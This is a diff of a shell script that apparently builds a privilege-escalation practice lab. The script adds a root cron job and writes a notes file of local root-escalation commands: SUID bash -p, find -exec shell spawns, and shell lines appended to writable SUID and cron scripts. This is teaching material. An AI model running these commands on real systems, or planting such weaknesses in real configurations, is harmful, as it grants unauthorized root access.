@@ -78,38 +78,33 @@ echo "* * * * * root /opt/backup/backup.sh" >> /etc/crontab
 
 echo "[+] Creating training notes..."
 
-cat << 'EOF' > /home/normaluser/root_normaluser
+cat << 'EOF' > /home/normaluser/privesc_notes.txt
 
 Privilege Escalation Enumeration Guide
 
-Find SUID binaries:
-
-find / -perm -4000 -type f 2>/dev/null
-
-Pro tip if list is huge:
-
-find / -perm -4000 -type f 2>/dev/null | grep -E "python|perl|bash|nmap|vim|more|less"
-
-Examples to exploit:
-
 SUID bash
+
 /usr/local/bin/bash -p
 
-Python capability exploit
-/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+SUID find
 
-Sudo find exploit
-sudo find . -exec /bin/sh -p \; -quit
+/usr/local/bin/find . -exec /bin/bash -p \; -quit
 
-Writable SUID script exploit
+ sudo find
+
+sudo find . -exec /bin/bash -p \; -quit
+
+Writable SUID script
+
 echo "/bin/bash -p" >> /opt/myapp/cleanup_script.sh
 
-Cron job exploit
+Cron job injection
+
 echo "/usr/local/bin/bash -p" >> /opt/backup/backup.sh
 
-Use pspy to discover cron jobs
+ Custom SUID binary
 
-./pspy64
+/usr/local/bin/privesc
 
 EOF
 
@@ -127,7 +122,7 @@ echo "[+] Enabling cron..."
 
 systemctl enable cron
 systemctl start cron
-chmod u+s /usr/bin/python3
+
 echo -e "\e[33m\e[0m"
 echo -e "\e[33m========================================\e[0m"
 echo -e "\e[33m      PRIVILEGE ESCALATION LAB READY\e[0m"
